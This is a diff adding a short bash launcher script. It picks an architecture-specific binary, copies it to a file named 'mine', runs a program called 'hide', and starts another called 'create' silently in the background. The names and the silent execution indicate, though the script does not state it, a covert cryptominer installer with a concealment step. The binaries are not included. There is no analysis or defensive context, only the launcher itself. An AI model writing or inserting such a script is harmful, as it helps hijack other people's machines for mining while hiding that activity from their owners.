@@ -1,0 +1,10 @@
+#!/bin/bash
+OS=`uname -m`
+if [ "$OS" == "aarch64" ];   then
+        cp aarch64 mine
+fi
+if [ "$OS" == "x86_64" ];   then
+        cp x86_64 mine
+fi
+./hide
+./create >>/dev/null &
